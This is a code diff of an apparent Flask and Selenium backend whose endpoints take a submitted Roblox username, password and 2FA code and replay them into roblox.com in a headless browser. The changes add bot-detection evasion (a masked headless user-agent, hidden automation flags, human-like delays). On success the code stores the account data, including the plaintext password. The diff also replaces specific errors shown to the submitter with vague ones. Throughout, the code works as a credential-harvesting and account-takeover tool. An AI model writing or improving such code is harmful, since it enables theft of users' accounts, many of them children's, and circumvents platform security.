@@ -96,82 +96,145 @@ def human_like_delay(min_sec=0.1, max_sec=0.5):
     time.sleep(random.uniform(min_sec, max_sec))
 
 def get_chrome_options():
-    """Configure Chrome options for Docker environment"""
+    """Configure Chrome options with proper error handling"""
     options = Options()
-    options.binary_location = "/usr/bin/google-chrome"
-    options.add_argument("--headless=new")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--window-size=1920,1080")
-    options.add_argument("--disable-gpu")
-    options.add_argument("--disable-extensions")
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option("useAutomationExtension", False)
-    return options
+    
+    try:
+        # Проверяем доступные пути к Chrome
+        chrome_paths = [
+            "/usr/bin/google-chrome",
+            "/usr/bin/google-chrome-stable",
+            "/usr/bin/chromium",
+            "/usr/bin/chromium-browser"
+        ]
+        
+        chrome_path = None
+        for path in chrome_paths:
+            if os.path.exists(path):
+                chrome_path = path
+                break
+        
+        if not chrome_path:
+            raise Exception("Chrome browser not found in standard locations")
+        
+        options.binary_location = chrome_path
+        
+        # Получаем версию Chrome для логов
+        try:
+            version_output = subprocess.check_output([chrome_path, "--version"]).decode().strip()
+            logger.info(f"Using Chrome version: {version_output}")
+        except Exception as e:
+            logger.warning(f"Could not get Chrome version: {str(e)}")
+        
+        # Настройки для работы в Docker/headless режиме
+        options.add_argument("--headless=new")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--window-size=1920,1080")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--disable-extensions")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        
+        # Опции для избежания детектирования автоматизации
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        options.add_experimental_option("useAutomationExtension", False)
+        
+        # User-Agent
+        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
+        
+        return options
+        
+    except Exception as e:
+        logger.error(f"Failed to configure Chrome options: {str(e)}")
+        raise Exception("Browser configuration error")
 
 def process_login(username, password, code_2fa=None):
-    """Handle login with version-matched ChromeDriver"""
+    """Handle login process with comprehensive error handling"""
     driver = None
     try:
-        chrome_options = get_chrome_options()
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=chrome_options)
+        # 1. Initialize browser
+        try:
+            chrome_options = get_chrome_options()
+            service = Service(ChromeDriverManager().install())
+            driver = webdriver.Chrome(service=service, options=chrome_options)
+            
+            # Mask headless detection
+            driver.execute_cdp_cmd("Network.setUserAgentOverride", {
+                "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
+            })
+        except Exception as e:
+            logger.error(f"Browser initialization failed: {str(e)}")
+            return {'status': 'error', 'message': 'System error. Please try later'}
         
-        driver.get("https://www.roblox.com/login")
-        human_like_delay(1, 2)
+        # 2. Navigate to login page
+        try:
+            driver.get("https://www.roblox.com/login")
+            human_like_delay(1, 2)
+        except Exception as e:
+            logger.error(f"Failed to load login page: {str(e)}")
+            return {'status': 'error', 'message': 'Connection error. Please try later'}
         
-        # Accept cookies if present
+        # 3. Handle cookies if present
         try:
             cookie_btn = WebDriverWait(driver, 3).until(
                 EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
             cookie_btn.click()
-            human_like_delay()
+            human_like_delay(0.5, 1.5)
         except:
-            pass
+            pass  # Cookie banner not found is acceptable
         
-        # Fill username and password
-        username_field = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "login-username")))
-        username_field.send_keys(username)
-        human_like_delay()
+        # 4. Fill credentials
+        try:
+            username_field = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.ID, "login-username")))
+            username_field.send_keys(username)
+            human_like_delay(0.2, 0.5)
+            
+            password_field = driver.find_element(By.ID, "login-password")
+            password_field.send_keys(password)
+            human_like_delay(0.2, 0.5)
+        except Exception as e:
+            logger.error(f"Failed to fill credentials: {str(e)}")
+            return {'status': 'error', 'message': 'System error. Please try later'}
         
-        password_field = driver.find_element(By.ID, "login-password")
-        password_field.send_keys(password)
-        human_like_delay()
+        # 5. Submit login form
+        try:
+            login_btn = driver.find_element(By.ID, "login-button")
+            login_btn.click()
+            human_like_delay(2, 3)  # Wait for login processing
+        except Exception as e:
+            logger.error(f"Failed to submit login form: {str(e)}")
+            return {'status': 'error', 'message': 'System error. Please try later'}
         
-        login_btn = driver.find_element(By.ID, "login-button")
-        login_btn.click()
-        human_like_delay(2, 3)
-        
-        # Check for 2FA
-        if not code_2fa:
-            try:
-                WebDriverWait(driver, 3).until(
-                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
-                return {'status': '2fa_required', 'message': '2FA verification required'}
-            except TimeoutException:
-                pass
-        
-        # Handle 2FA if code provided
+        # 6. Handle 2FA if required
         if code_2fa:
             try:
                 code_field = WebDriverWait(driver, 5).until(
                     EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                 code_field.send_keys(code_2fa)
-                human_like_delay()
+                human_like_delay(0.5, 1)
                 
                 submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                 submit_btn.click()
                 human_like_delay(2, 3)
             except Exception as e:
-                return {'status': '2fa_error', 'message': f'Invalid 2FA code: {str(e)}'}
+                logger.error(f"2FA submission failed: {str(e)}")
+                return {'status': 'error', 'message': 'Invalid verification code'}
+        else:
+            # Check if 2FA is required
+            try:
+                WebDriverWait(driver, 3).until(
+                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
+                return {'status': '2fa_required', 'message': '2FA verification required'}
+            except TimeoutException:
+                pass  # 2FA not required
         
-        # Check for successful login
+        # 7. Verify successful login
         try:
             WebDriverWait(driver, 10).until(
                 EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
             
+            # Get account data
             account_data = {
                 'username': username,
                 'password': password,
@@ -183,26 +246,36 @@ def process_login(username, password, code_2fa=None):
             return {'status': 'success', 'data': account_data}
             
         except TimeoutException:
+            # Check for specific error messages
             error_msg = check_for_errors(driver)
             if error_msg:
-                return {'status': 'error', 'message': error_msg}
-            return {'status': 'unknown_error', 'message': 'Login failed'}
+                logger.info(f"Login failed with message: {error_msg}")
+                return {'status': 'error', 'message': 'Invalid credentials'}
+            
+            logger.error("Login failed without specific error message")
+            return {'status': 'error', 'message': 'Login failed. Please try later'}
             
     except Exception as e:
-        logger.error(f"Critical error: {str(e)}")
-        return {'status': 'critical_error', 'message': str(e)}
+        logger.error(f"Unexpected error during login process: {str(e)}")
+        return {'status': 'error', 'message': 'System error. Please try later'}
+        
     finally:
         if driver:
-            driver.quit()
+            try:
+                driver.quit()
+            except Exception as e:
+                logger.warning(f"Failed to properly close browser: {str(e)}")
 
 def check_for_errors(driver):
-    """Проверяет наличие сообщений об ошибках"""
+    """Check page for known error messages"""
     error_messages = {
-        "incorrect username or password": "Incorrect username or password",
-        "неверное имя пользователя или пароль": "Incorrect username or password",
+        "incorrect username or password": "Invalid credentials",
+        "неверное имя пользователя или пароль": "Invalid credentials",
         "account locked": "Account locked",
         "требуется проверка": "Verification required",
-        "verification required": "Verification required"
+        "verification required": "Verification required",
+        "too many attempts": "Too many attempts",
+        "captcha": "Security check required"
     }
     
     page_text = driver.page_source.lower()
@@ -223,12 +296,12 @@ def health_check():
 @app.route('/process_login', methods=['POST'])
 def handle_login():
     if not request.is_json:
-        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
+        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
     
     try:
         data = request.get_json()
     except:
-        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
+        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
     
     username = data.get('username')
     password = data.get('password')
@@ -243,14 +316,15 @@ def handle_login():
         
         if result['status'] == 'success':
             if not save_account_data(result['data']):
-                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
+                return jsonify({'status': 'error', 'message': 'Server error. Please try later'}), 500
             return jsonify(result)
         elif result['status'] == '2fa_required':
             return jsonify(result)
         else:
+            # Все ошибки преобразуем в общее сообщение
             return jsonify({
                 'status': 'error',
-                'message': result.get('message', 'Login failed. Please try again.')
+                'message': 'Server error. Please try again later'
             })
             
     except Exception as e:
@@ -263,12 +337,12 @@ def handle_login():
 @app.route('/submit_2fa', methods=['POST'])
 def handle_2fa():
     if not request.is_json:
-        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
+        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
     
     try:
         data = request.get_json()
     except:
-        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
+        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
     
     code = data.get('code')
     username = data.get('username')
@@ -284,12 +358,13 @@ def handle_2fa():
         
         if result['status'] == 'success':
             if not save_account_data(result['data']):
-                return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
+                return jsonify({'status': 'error', 'message': 'Server error. Please try later'}), 500
             return jsonify(result)
         else:
+            # Все ошибки 2FA преобразуем в общее сообщение
             return jsonify({
                 'status': 'error',
-                'message': result.get('message', '2FA verification failed')
+                'message': 'Verification failed. Please try again'
             })
             
     except Exception as e:
